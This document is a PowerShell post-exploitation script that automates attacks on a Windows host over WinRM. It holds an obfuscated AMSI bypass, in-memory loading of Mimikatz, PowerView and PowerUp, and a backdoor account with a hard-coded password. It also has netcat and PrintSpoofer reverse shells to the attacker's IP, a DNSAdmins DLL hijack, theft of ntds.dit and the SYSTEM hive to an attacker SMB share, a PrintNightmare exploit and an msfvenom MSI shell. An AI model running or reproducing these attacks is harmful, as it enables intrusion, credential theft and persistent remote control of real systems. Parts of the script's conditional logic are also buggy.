function Invoke-Everything-WinRM
<# 
Script is ran within WinRM, it does not ask any questions, for full capabilities of script please start an SMB Server on your local machine with a share of share
smbserver.py . share -smb2support
Victim Machine needs internet access, or specify if no internet access in on machine and if it can connect back to local machine, if so start python server

.EXAMPLE
> Invoke-Everything-WinRM -attackerip 192.168.1.2 -lport 4444

#>

{
	[cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP,

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $LPORT
    )


    if ($AttackerIP -and $LPORT)
    {
		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Run Get-Help Invoke-Everything-WinRM to see examples"
		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Running AMSI Bypass"
    	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
    	
    	echo ""

    	iex (iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
    	$user = whoami /all > invoke-winrm.txt
    	$admin = get-adgroupmember "Domain Admins" >> invoke-winrm.txt
    	$local = net localgroup "Administrators" >> invoke-winrm.txt
    	$bit =  (Get-WMIObject win32_operatingsystem) | Select OSArchitecture >> invoke-winrm.txt
        $system = systeminfo >> invoke-winrm.txt
        echo ""
    	
    	write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Seeing if user is within administrators group"
    	sleep 2
    	if ($user -contains "Domain Admins" -or "Administrators")
    		{
    			write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Is an admin" >> invoke-winrm.txt
    			echo ""
    			write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Creating new user for persistence with username: Carrot and password: P@ssw0rd1!"
    			net user Carrot P@ssw0rd1! /add
    			echo "Putting Invoke-Mimikatz.ps1 into memory"
    			iex (iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)
     		}
    	else {
    			echo "Not an admin" >> invoke-winrm.txt
    			echo ""
    		 }
        
        if ($bit = "64-bit")
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]System is 64 bit"

        }
        elseif ($bit = "32-bit")
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]System is 32 bit"
        }
        else 
        {}

    	write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Script Running, start SMB Server on local machine for full capabilities (smbserver.py . share -smb2support)"
    	sleep 3
    	write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Everything will be put in invoke-winrm.txt"
    	echo ""
    	sleep 2
    	write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Network information"
    	arp -a >> invoke-winrm.txt
    	ipconfig >> invoke-winrm.txt
    	sleep 2
    	echo ""

    	if ($user -contains "Server Operators" -and $bit -contains "64-bit")
    	{
    		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user is within Server Operators group, exploiting now"
    		echo ""
    		sleep 2
    		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds"
    		echo ""
    		sleep 10
    		mkdir C:\Windows\Temp
    		services >> invoke-winrm.txt
    		wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
    		echo ""
    		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading NC64.exe into C:\Windows\Temp"
    		sc.exe config vss binpath="C:\Windows\temp\nc64.exe -e cmd.exe $AttackerIP $LPORT"
    		echo ""
    		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Restarting vss service, check nc listener to see if you get a call back"
    		stop-service vss
    		start-service vss
     	}
     	elseif ($user -contains "Server Operators" -and $bit -contains "32-bit")
     	{
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user is within Server Operators group, exploiting now"
    		echo ""
    		sleep 2
    		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds"
    		echo ""
    		sleep 10
    		mkdir C:\Windows\Temp
    		services >> invoke-winrm.txt
    		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading NC64.exe into C:\Windows\Temp"
    		wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc.exe -outfile C:\Windows\Temp\nc.exe
    		echo ""
    		sc.exe config vss binpath="C:\Windows\temp\nc.exe -e cmd.exe $AttackerIP $LPORT"
    		echo ""
    		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Restarting vss service, check nc listener to see if you get a call back"
    		stop-service vss
    		start-service vss
     	}
     	else {}

     	if ($user -contains "DNSAdmins" -and $bit -contains "64-bit")
     	{
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]User is within DNSAdmins group exploiting now" >> invoke-winrm.txt
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make msfvenom file with the following msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT -f dll > serverlevelplugin.dll"
     		sleep 5
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start webserver on port 80 ex: (python3 -m http.server)"
     		sleep 10
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading serverlevelplugin.dll from $AttackerIP"
     		mkdir C:\Windows\Temp
     		wget -usebasicparsing http://$AttackerIP/$LPORT -outfile C:\Windows\Temp\serverlevelplugin.dll
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start NC listener on port $LPORT, waiting 10 seconds ex (nc -lvnp $LPORT)"
     		sleep 10
     		dnscmd 127.0.0.1 /config /serverlevelplugindll C:\Windows\Temp\serverlevelplugin.dll
     	}
     	
     	elseif ($user = "DNSAdmins" -and $bit -contains "32-bit")
     	{
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]User is within DNSAdmins group exploiting now" >> invoke-winrm.txt
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make msfvenom file with the following msfvenom -p windows/meterpreter/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT -f dll > serverlevelplugin.dll"
     		sleep 5
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start webserver on port 80 ex: (python3 -m http.server)"
     		sleep 10
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading serverlevelplugin.dll from $AttackerIP"
     		mkdir C:\Windows\Temp
     		wget -usebasicparsing http://$AttackerIP/$LPORT -outfile C:\Windows\Temp\serverlevelplugin.dll
     		echo ""
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start NC listener on port $LPORT, waiting 10 seconds ex (nc -lvnp $LPORT)"
     		sleep 10
     		dnscmd 127.0.0.1 /config /serverlevelplugindll C:\Windows\Temp\serverlevelplugin.dll
     	}

     	else {}

     	if ($user = "SeBackupPrivilege")
     	{
     	write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeBackupPrivilege, exploiting now" >> invoke-winrm.txt
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading script.txt"
        wget -usebasicparsing https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/script.txt -outfile script.txt
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Deleting system.bak"
        del system.bak
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running Disk Shadow"
        diskshadow /s script.txt
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running Robocopy for ntds.dit"
        robocopy /b E:\Windows\ntds . ntds.dit
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Saving system.bak"
        reg save hklm\system system.bak 
        cp system.bak \\$AttackerIP\share
        cp ntds.dit \\$AttackerIP\share
    }
}
    else 
    { 
    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Need Attacker IP and LPORT ex: Invoke-Everything-WinRM -attackerip <your ip> -lport 4444"
    }
    if ($user = "SeImpersonatePrivilege" -and $bit -contains "64-bit")
    {
        if (select-string "2019" invoke-winrm.txt)
        {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is 2019 running PrintSpoofer"
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
        sleep 10
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
        }
        elseif (select-string "Windows 10" invoke-winrm.txt)
        {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is Windows 10 running PrintSpoofer"
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
        sleep 10
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
    }
        elseif (select-string "2016" invoke-winrm.txt)
        {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is 2016 running PrintSpoofer"
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
        sleep 10
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
        }
        elseif (select-string "2022" invoke-winrm.txt)
        {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is 2022 running PrintSpoofer"
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
        sleep 10
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
        }
        elseif (select-string "Windows 7" invoke-winrm.txt)
         {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is Windows 7 running Juicy Potato"
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
        #wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        #wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
        sleep 10
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
        }
        elseif (select-string "2012" invoke-winrm.txt)
        {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Machine is Windows 2012 running Juicy Potato"
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
        #wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        #wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc64.exe -outfile C:\Windows\Temp\nc64.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
        sleep 10
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc64.exe $AttackerIP $LPORT -e cmd"
        }
    }

    #NEED TO ADD JUICY POTATO AND PRINTSPOOFER TO THIS LOWER AREA
    if ($user = "SeImpersonatePrivilege" -and $bit -contains "32-bit")
    {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege, exploiting now" >> invoke-winrm.txt
        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc.exe -outfile C:\Windows\Temp\nc.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
        sleep 10
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you have a shell"
        C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe $AttackerIP $LPORT -e cmd"
    }



    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Checking for PrintNightmare"
    iex (iwr -usebasicparsing https://raw.githubusercontent.com/xbufu/PrintNightmareCheck/main/Invoke-NightmareCheck.ps1) >> invoke-winrm.txt
    if (select-string "System is likely VULNERABLE!" invoke-winrm.txt)
    {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Exploiting PrintNightmare"
        iex (iwr -usebasicparsing https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1)
        invoke-nightmare
    }
    else
    {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Host most likely not vulnerable"
    }
    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Checking for AlwaysInstallElevated"
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> invoke-winrm.txt
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> invoke-winrm.txt
    if (select-string "0x1" invoke-winrm.txt)
    {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Registry has AlwaysInstallElevated on, exploiting"
        if ($bit -contains "64-bit")
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start webserver on port 80 on $AttackerIP"
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make file msfvenom -p windows/x64/shell/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT > shell.msi"
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on $LPORT"
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Waiting 30 seconds"
            sleep 30
            mkdir C:\Windows\Temp
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading shell.msi"
            wget -usebasicparsing http://$AttackerIP/shell.msi -outfile C:\Windows\Temp\shell.msi
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you get a shell"
            msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
        }
        else
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start webserver on port 80 on $AttackerIP"
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make file msfvenom -p windows/shell/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT > shell.msi"
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on $LPORT"
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Waiting 30 seconds"
            sleep 30
            mkdir C:\Windows\Temp
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Downloading shell.msi"
            wget -usebasicparsing http://$AttackerIP/shell.msi -outfile C:\Windows\Temp\shell.msi
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Hopefully you get a shell"
            msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
        }
    }

    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Putting PowerUp.ps1 in memory"
    echo ""
    iex (iwr -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)
    write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Running Invoke-AllChecks, may take a minute"

}


